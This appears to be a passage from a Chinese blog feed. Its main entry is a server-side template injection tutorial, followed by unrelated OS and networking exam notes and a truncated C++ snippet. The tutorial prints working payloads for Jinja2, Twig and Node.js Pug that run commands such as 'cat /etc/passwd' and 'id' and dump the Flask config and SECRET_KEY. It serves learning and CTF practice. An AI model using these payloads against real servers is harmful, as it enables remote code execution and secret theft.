href="https://www.raingray.com/archives/4183.html#Web+Security+Academy">Web Security Academy</a></li></ul></li><li><a href="https://www.raingray.com/archives/4183.html#%E9%98%B2%E5%BE%A1">防御</a></li><li><a href="https://www.raingray.com/archives/4183.html#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li></ul><h2 id="简介">简介</h2><p><a href="https://portswigger.net/research/server-side-template-injection">Server-Side Template Injection</a> 2015 年由 <a href="https://twitter.com/albinowax">James Kettle</a> 在 Black Hat 提出完整利用链 SSTI 至此普及开来。说到后端模板与之对应的还有前端模板（CSTI），就是各种前端框架模板，一般危害就是执行 JS 代码。本文旨在简略记录后端模板基本原理不涉及前端模板内容。</p><p><strong>模板是什么？</strong></p><p>了解模板之前先看原来开发模式和模板开发有什么区别，最早开发是前后端都揉在一起，不管你在哪里要用到这 HTML 显示数据都需要重写一遍。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> name <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>有了模板就可以先写好前端样式后面在填充数据，写好的前端可以被重复使用。</p><p>模板原理是往里 HTML 填充数据，最后通过模板引擎把前端和数据组装在一起返回。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&#123;&#123; name &#125;&#125;&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>模板引擎将输入的 name 变量最终替换为完整 HTML。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>raingray<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>啥是模板注入？</strong></p><p>用户输入的内容被放入模板渲染。这个内容通常是表达式，如 <code>&#123;&#123; eval('cat /etc/passwd') &#125;&#125;</code>，渲染后表达式被执行。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;root:x:0:0:root/root:/bin/bash......&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p><strong>模板注入的危害是什么？</strong></p><p>通常可以调各个库来执行命令造成 RCE，能查当前对象的信息可能会返回 Secret 等模板信息，造成敏感信息泄露，再不济也是个 XSS。</p><p>说白了就是你能调语言啥库，能执行命令就 RCE，能读取文件就 LFI。</p><p><strong>咋找注入点？</strong></p><p>任何输入的内容被应用结合模板输出的地方都可以试，如模板大多支持写入 HTML，有 HTML 注入的地方要联想到可能存在模板注入，所以要随手尝试闭合 <code>&#125;&#125;&lt;h1&gt;raingray&lt;/h1&gt;&#123;&#123;`。通常会在功能点 Fuzz 模板需要用到的特殊字符 `$&#123;&#123;<%[%'"&#125;&#125;%</code>，如果报错就可能存在。</p><p><strong>咋判断 App 用的那款模板？</strong></p><p>BurpSuite 官方给出一个判断逻辑，执行蓝色方块表达式，绿色箭头代表表达式成功执行，红色箭头代表走不通。如 <code>&#123;&#123;7*'7'&#125;&#125;</code> Jinja2 返回 7777777，Twig 返回 49，当没有结果时则漏洞不存在。</p><p><img src="https://www.raingray.com/usr/uploads/2022/05/2793999129.png" alt="模板注入识别逻辑.png"></p><p>图片来自 <a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a></p><h2 id="利用">利用</h2><p>利用思路是阅读模板官方文档关键点：</p><ol><li>基本语法。知道怎么用。</li><li>安全建议。了解常见风险点。</li><li>内部变量。类似于 Java Reflection，或 Python Magic Method/<a href="https://docs.python.org/3/library/stdtypes.html#special-attributes">Special Attributes</a>，通过当前对象快速获取其他对象并调用利用。</li></ol><h3 id="Python-Jinja2">Python Jinja2</h3><h4 id="subprocess-Popen-执行命令">subprocess.Popen 执行命令</h4><p><a href="https://jinja.palletsprojects.com/en/3.0.x/api/#jinja2.Environment">jinja2</a> 语法：</p><ul><li><p><code>&#123;%` block 开始  `%&#125;</code> block 结束</p></li><li><p><code>&#123;&#123;` print statement 开始  `&#125;&#125;</code> print statement 结束</p></li><li><p>`` comment 结束</p></li></ul><p>确认表达式被应用执行，内容返回七个字符串 7，或者返回 49。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;7&#x27;*7&#125;&#125;</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>获取 object 类</strong></p><p>使用 <code>''.__class__</code> 属性获取 str 类实例，将返回 <code>&lt;class 'str'&gt;</code>。也可以使用其他基础数据类型，如 <code>[]</code>、<code>&#123;&#125;</code>。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__ &#125;&#125;</span><br></pre></td></tr></table></figure><p><code>__mro__</code>（<a href="https://data-flair.training/blogs/python-multiple-inheritance/">Method Resolution Order</a>）属性返回一个包含基类元组 <code>(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</code>，告诉你调用属性、方法时按照元组中的顺序查找。和 <code>__mro__</code> 一致的方法还有 <code>mro()</code> 作用一致只是返回数据类型是列表。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>__base__</code> 和 <code>__bases__</code> 都能获得继承的第一个基类 object，只是 <code>__bases__</code> 返回元组，另一个区别是在 Python2 里是获取字符串类 str 基类返回是 <code>&lt;type 'basestring'&gt;</code>。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;</span><br></pre></td></tr></table></figure><p>获取基类是要得到 object，它是所有类的基类可以通过它得到 Python 中任何类的信息。通过更改索引 <code>''.__class__.__mro__[index]</code> 区选返回哪个索引内容，如 <code>''.__class__.__mro__[1]</code> 将返回 <code>&lt;class 'object'&gt;</code>。</p><p><strong>获取 object 子类</strong></p><p>拿到 object 后用 <code>__subclasses__()</code> 方法返回包含子类的列表。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.mro()[1].__subclasses__()&#125;&#125; </span><br></pre></td></tr></table></figure><p><img src="https://www.raingray.com/usr/uploads/2022/05/3164248832.png" alt="__subclasses__执行结果.png"></p><p>手动替换换行。</p><p><img src="https://www.raingray.com/usr/uploads/2022/05/2219082032.png" alt="手动替换换行符1.png"></p><p>找到 <code>&lt;class 'subprocess.Popen'&gt;</code>，确定索引是 233。</p><p><img src="https://www.raingray.com/usr/uploads/2022/05/802831487.png" alt="手动替换换行符2.png"></p><p>既然通过索引能获取到 <code>subprocess.Popen</code> 类，通过 <code>()</code> 执行构造方法，传递要执行的命令。命令执行完 <code>communicate()</code> 读取 stdout 和 stderr 数据组成元组 <code>(stdout_data, stderr_data)</code> 返回。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.mro()[1].__subclasses__()[233](&quot;cat /etc/passwd&quot;, shell=True, stdout=-1).communicate()[0]&#125;&#125; </span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.mro()[1].__subclasses__()[233]([&#x27;cat&#x27;, &quot;/etc/passwd&quot;], stdout=-1).communicate()[0]&#125;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://docs.python.org/3/library/subprocess.html#popen-constructor">subprocess.Popen 构造方法参数</a>为什么这样写？下面解读下。</p><p><em>args</em> 默认读取列表，命令以空格作为分隔符，比如 <code>cat /etc/passwd /etc/shadow</code>，就要写成 <code>['cat', '/etc/passwd', '/etc/shadow']</code>。</p><p><em>shell</em> 使用 <code>shell=True</code> 可直接在引号内写命令。Linux 下默认使用 /bin/sh 执行命令，Windows 怎么执行不太清楚。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Popen([&#x27;/bin/sh&#x27;, &#x27;-c&#x27;, &#x27;cat /etc/passwd&#x27;])</span><br></pre></td></tr></table></figure><p><em>stdout</em> 具体为什么用 -1 暂时无法得知，不用就无法输出数据。</p><h4 id="读取-Flask-配置">读取 Flask 配置</h4><p>如果无法读取文件尝试看看能不能获取 Flask 配置信息</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>重点关注配置中 SECRET_KEY 项。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Config &#123;&#x27;JSON_AS_ASCII&#x27;: True, &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;LOGGER_HANDLER_POLICY&#x27;: &#x27;always&#x27;, &#x27;LOGGER_NAME&#x27;: &#x27;app&#x27;, &#x27;DEBUG&#x27;: False, &#x27;SECRET_KEY&#x27;: None, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: None, &#x27;SERVER_NAME&#x27;: None, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: True, &#x27;TESTING&#x27;: False, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: False, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(0, 43200), &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False&#125;&gt;</span><br></pre></td></tr></table></figure><h4 id="self-对象获取">self 对象获取</h4><h4 id="其他-Payload">其他 Payload</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&gt;&gt;&gt; import jinja2</span></span><br><span class="line"><span class="language-xml">&gt;&gt;&gt; jinja2.Template(&quot;</span><span class="template-variable">&#123;&#123; <span class="name">[].__class__.__base__.__subclasses__</span>() &#125;&#125;</span><span class="language-xml">&quot;).render()</span></span><br><span class="line"><span class="language-xml">&quot;[<span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">type</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">weakref</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">weakcallableproxy</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">weakproxy</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">int</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">bytearray</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">bytes</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">list</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">NoneType</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">NotImplementedType</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">traceback</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">super</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">range</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">dict</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">dict_keys</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">dict_values</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">dict_items</span>&#x27;&gt;</span>, <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">dict_rever......</span></span></span></span><br></pre></td></tr></table></figure><p><a href="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/">https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/</a></p><p>执行命令并输出在模板中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; self.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br></pre></td></tr></table></figure><p>能够获取 os 库的 Payload。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os &#125;&#125;</span><br><span class="line">&#123;&#123; self._TemplateReference__context.joiner.__init__.__globals__.os &#125;&#125;</span><br><span class="line">&#123;&#123; self._TemplateReference__context.namespace.__init__.__globals__.os &#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP-Twig-1-9-0">PHP Twig (1.9.0)</h3><p>Payload。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&#x27;exec&#x27;)&#125;&#125;&#123;&#123;_self.env.getFilter(&#x27;uname&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Node-js-Pug">Node.js Pug</h3><p>通过 NodeJS 全局对象 global，查找 require 导入 child_process.exec 执行命令。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>14.0.0 之前版本 <a href="http://nodejs.cn/api/process/process_mainmodule.html">mainModule</a> 还没被移除有以下方法可以使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="靶场练习">靶场练习</h2><h3 id="BUUCTF">BUUCTF</h3><ul><li>[<a href="https://buuoj.cn/challenges#%5BCSCCTF%202019%20Qual%5DFlaskLight">https://buuoj.cn/challenges#[CSCCTF 2019 Qual]FlaskLight</a>](<a href="https://buuoj.cn/challenges#">https://buuoj.cn/challenges#</a>[CSCCTF 2019 Qual]FlaskLight)</li><li>[<a href="https://buuoj.cn/challenges#%5BHFCTF%202021%20Final%5Deasyflask">https://buuoj.cn/challenges#[HFCTF 2021 Final]easyflask</a>](<a href="https://buuoj.cn/challenges#">https://buuoj.cn/challenges#</a>[HFCTF 2021 Final]easyflask)</li><li><a href="https://buuoj.cn/challenges#%5Bpasecactf_2019%5Dflask_ssti">https://buuoj.cn/challenges#[pasecactf_2019]flask_ssti</a></li><li><a href="https://buuoj.cn/challenges#%5BFlask%5DSSTI">https://buuoj.cn/challenges#[Flask]SSTI</a></li><li>[<a href="https://buuoj.cn/challenges#%5B%E7%AC%AC%E4%B8%89%E7%AB%A0%20web%E8%BF%9B%E9%98%B6%5DSSTI">https://buuoj.cn/challenges#[第三章 web进阶]SSTI</a>](<a href="https://buuoj.cn/challenges#">https://buuoj.cn/challenges#</a>[第三章 web进阶]SSTI)</li></ul><h3 id="Web-Security-Academy">Web Security Academy</h3><ul><li><a href="https://portswigger.net/web-security/server-side-template-injection">PortSwigger Web Security Academy</a></li></ul><h2 id="防御">防御</h2><p>参考各个模板文档正确转义输出语句。</p><h2 id="参考链接">参考链接</h2><ul><li><p>[PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection)</p><p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI (Server Side Template Injection) - HackTricks</a>，包揽市面上常见模板利用 Payload，做项目时可以照着一把梭。</p></li><li><p><a href="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/">Python vulnerabilities : Code execution in jinja templates</a></p></li><li><p><a href="https://janakiev.com/blog/python-shell-commands/">How to Execute Shell Commands with Python</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>段页式期末复习</title>
      <link href="/posts/71641dc5.html"/>
      <url>/posts/71641dc5.html</url>
      
        <content type="html"><![CDATA[<h3 id="页表和段表">页表和段表</h3><hr><blockquote><p>地址变换</p></blockquote><p><img src="https://s1.vika.cn/space/2024/05/29/09b4b54906e34763b4fb073b910a1b59" alt=""></p><blockquote><p>时间和空间局部性原理</p></blockquote><p><img src="https://s1.vika.cn/space/2024/05/30/2631d7ce8ffd452a9ad49d613c2ca508" alt=""></p><blockquote><p>有快表下,查找效率的对比</p></blockquote><p><img src="https://s1.vika.cn/space/2024/05/30/bb5c75f8c41a41519945620a6358230c" alt=""></p><p><strong>注:注意看清楚是否支持快表慢表同时查找,如果是的话,那么查询慢表的同时也查询了快表</strong></p><blockquote><p>多级页表的分配</p></blockquote><p><img src="https://s1.vika.cn/space/2024/05/30/0ad0a334e8ff424c9f1fe48de5fc8c72" alt=""></p><p><strong>各级页表的大小不能超过一个页面</strong></p><hr><h3 id="分段机制">分段机制</h3><p><strong>段表和页表的区别</strong></p><p><img src="https://s1.vika.cn/space/2024/05/30/caa78a4e4d3b4107afee229566d2571f" alt=""></p><p>每一段的大小是不固定的,因此段表中要多存储一项,即段长</p><p>而页表的每一项都是一样大小,因此可以像数组一样顺序访问!无需存储每一页的大小</p><blockquote><p>分段过程中的地址变换过程</p></blockquote><p><img src="https://s1.vika.cn/space/2024/05/30/067779be282640f1b08aec908f4c1c11" alt=""></p><p><strong>分段 与 分页的对比</strong></p><p><img src="https://s1.vika.cn/space/2024/05/30/ed0b47f1210a4543a8f0f06d2648cb77" alt=""></p><p><strong>分段更容易实现 信息的共享和保护</strong><br><img src="https://s1.vika.cn/space/2024/05/30/b25cf96c8f774042a1f763efc8cbf1a2" alt=""></p><h3 id="段页式分配内存">段页式分配内存</h3><p><img src="https://s1.vika.cn/space/2024/05/30/0d010c1e47f0484bb4d6622196f8e946" alt=""></p><p><strong>段页式管理的逻辑地址结构</strong></p><p><img src="https://s1.vika.cn/space/2024/05/30/ce9e3c4ed8494028bb161c41dd40990a" alt=""></p><p>段页式下段表存放的是页表的存放块号,通过段号从而找到页号</p><p><img src="https://s1.vika.cn/space/2024/05/30/5a809f16d3044f85bb12962011d795c8" alt=""></p><p>段页式访问内存的次数:<strong>3</strong>次</p><p><img src="https://s1.vika.cn/space/2024/05/30/869c13218625425cb76cb67ec8a4ab5d" alt=""></p><p><code>但是同样也可通过快表减少访存次数</code></p>]]></content>
      
      
      <categories>
          
          <category> 期末复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网网络层复习</title>
      <link href="/posts/a56d537a.html"/>
      <url>/posts/a56d537a.html</url>
      
        <content type="html"><![CDATA[<h3 id="网络层概述-主要任务">网络层概述(主要任务)</h3><p><img src="https://s1.vika.cn/space/2024/05/18/4e495f35a19647d09c99ed11fe727c05" alt=""></p><p><code>因特网不采用面向连接的虚电路服务而让网络层变得简单,使用无连接的数据包服务</code></p><p><strong>因此网络层向上提供的是不可靠的服务!</strong></p><p><img src="https://s1.vika.cn/space/2024/05/18/291f5a2a06b5465fa1ddc743f1a04f6f" alt=""></p><p><img src="https://s1.vika.cn/space/2024/05/18/f95c58f9c18a4574b7debc1373ab50b3" alt=""></p><h3 id="IPv4地址-32位">IPv4地址(32位)</h3><ol><li><p>分类</p><ul><li><p>A</p></li><li><p>B</p></li><li><p>C</p></li><li><p>其他(暂未分配)</p><p><img src="https://s1.vika.cn/space/2024/05/18/bb1e5fc32e7c41e3bd2f216a8463ae3e" alt=""></p></li></ul></li><li><p>注意事项.比特位全零地址为网络地址,全1的为广播地址.这两个地址不能分配给主机或者路由器</p></li><li><p><img src="https://s1.vika.cn/space/2024/05/18/173115af87c542c6a8182a6dd6c8dbc0" alt=""></p></li><li><p>特殊IP地址</p><p><img src="https://s1.vika.cn/space/2024/05/18/14ca85fdeb6d4aa1a5aef48a52ad0307" alt=""></p></li></ol><h3 id="IP地址的分配">IP地址的分配</h3><p><code>思路:借用主机号的一些位作为子网号,用于区分不同的子网</code></p><p>为了快速标记出借了多少位作为子网号,这里引入子网掩码的概念</p><p><img src="https://s1.vika.cn/space/2024/05/18/0fd01692323b454eb9d1ecc3bd38f2c5" alt=""></p><p><code>注:借位之后的子网号要当成网络号而非主机号,此时它已经成为一个固定的号码限制不同的子网</code></p><p><strong>因此后面的主机号再为全零全一的情况要注意!</strong></p><h3 id="分析流程">分析流程</h3><ol><li><p>先判断是那个类的网(A,B,C)再根据子网掩码分析出借用多少位主机号作为子网号(<code>除去网络号全为1的部分就是借位的</code>)</p><p><img src="https://s1.vika.cn/space/2024/05/18/f173ea4ff7f74e6c8f0fafd84b430e50" alt=""></p></li></ol><p><img src="https://s1.vika.cn/space/2024/05/18/b30af0619d084001905cd49f3aecf366" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 新手村的操作 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计网数据链路层复习</title>
      <link href="/posts/8734b6e4.html"/>
      <url>/posts/8734b6e4.html</url>
      
        <content type="html"><![CDATA[<h3 id="数据链路层概述">数据链路层概述</h3><p><img src="https://s1.vika.cn/space/2024/05/18/4305fb99c96f4521a9734d26f4efd80e" alt=""></p><p><img src="https://s1.vika.cn/space/2024/05/18/b5b4fb62625348498835b2b1e5874b98" alt=""></p><p><strong>数据链路层以<code>帧</code>为单位传输和处理数据</strong></p><h3 id="需要解决的3个重要问题">需要解决的3个重要问题</h3><ul><li>封装成帧:在数据包加入帧头和帧尾(<code>帧定界</code>!,从一串bit流里面判断提取一个个完整的帧)</li><li>差错检测:出现误码时检验是否出现误码.封装在帧尾一般有4字节的检测码</li><li>透明传输:数据链路层对上层交付的传输数据没任何限制,就好像数据链路层不存在一样(解决帧定界符的转义问题,使之不出现干扰,使上层能完整接受一个帧)</li></ul><h3 id="以太网V2的MAC帧格式以及ppp帧">以太网V2的MAC帧格式以及ppp帧</h3><p><img src="https://s1.vika.cn/space/2024/05/18/98f7d6fc9f7642d394a95c0c47926d03" alt=""></p><p>tips:<code>MAC帧不需要帧界定,因为物理层会加入前导码以及帧间发送会有96bit的发送间隔</code></p><p>在一个帧中发现帧定界符或者转义字符时都要给之添加转义符,提取时发现转义符先把转义符去掉再提取数据:</p><p><img src="https://s1.vika.cn/space/2024/05/18/1c022ee0abf64ebfac9928a63cbb51c1" alt=""></p><h3 id="透明传输的实现">透明传输的实现</h3><ol><li><p><strong>字节传输</strong>:</p><p><img src="https://s1.vika.cn/space/2024/05/18/4dc8a1936ed24d7f80f9e6c4fa9de5fa" alt=""></p></li><li><p>比特传输(0bit填充)</p><p><img src="https://s1.vika.cn/space/2024/05/18/a54733252e2946c989114170d882f6bc" alt=""></p><p><img src="https://s1.vika.cn/space/2024/05/18/36c3d36137174e7c8b31635cc1888c65" alt=""></p></li></ol><p><img src="https://s1.vika.cn/space/2024/05/18/4ef1a1a68faa4e61ae9c15ba050e9fe2" alt=""></p><h3 id="差错检测">差错检测</h3><p><img src="https://s1.vika.cn/space/2024/05/18/1db8a05086f14d8e9b7329bc8f656a1d" alt=""></p><ul><li><p>奇偶校验</p><p><img src="https://s1.vika.cn/space/2024/05/18/3ee08f3077164e359bcff5ec34304f7a" alt=""></p></li><li><p><strong>CRC校验</strong></p><p><img src="https://s1.vika.cn/space/2024/05/18/d03e5c239b6e407d8f4412150b3558ad" alt=""></p></li></ul><p><strong>CRC计算过程:</strong></p><p><img src="https://s1.vika.cn/space/2024/05/18/597aab8f3daf4c908112efb05d431740" alt=""></p><p><code>检错码只能检出错误但是不能修正!</code></p><h3 id="可靠传输">可靠传输</h3><p><img src="https://s1.vika.cn/space/2024/05/18/3df45fc3a5be43e5a8b855a0cd2eb8d2" alt=""></p><p><code>只有无线局域网时要求数据链路层实现可靠传输服务,而以太网不要求数据链路层实现可靠传输而是依靠上层协议提供可靠传输服务</code></p><p><img src="https://s1.vika.cn/space/2024/05/18/e977b70be29b424793c74abc8cd3a9a6" alt=""></p><blockquote><p>停止等待协议</p></blockquote><p><img src="https://s1.vika.cn/space/2024/05/18/d542751281cb409c895269c3f8725d33" alt=""></p><p><img src="https://s1.vika.cn/space/2024/05/18/11de4787793d47bf9810b2e82911f648" alt=""></p><hr><h3 id="PPP点对点协议">PPP点对点协议</h3><p><img src="https://s1.vika.cn/space/2024/05/18/55b941f8cc05497f8e8bf2088185787a" alt=""></p><ul><li><p>解决透明传输</p><p><img src="https://s1.vika.cn/space/2024/05/18/7ec21d76d1854fa38b0c2e5fadd42e13" alt=""></p><p>bit 链路</p><p><img src="https://s1.vika.cn/space/2024/05/18/2713d0fe778c4378b843d91ba566b70a" alt=""></p></li></ul><p>PPP工作状态的切换</p><p><img src="https://s1.vika.cn/space/2024/05/18/3411d8afd1bf481093bda4f3195e88dd" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 新手村的操作 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>小垃圾</title>
      <link href="/posts/b757dff5.html"/>
      <url>/posts/b757dff5.html</url>
      
        <content type="html"><![CDATA[<p>1:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n, 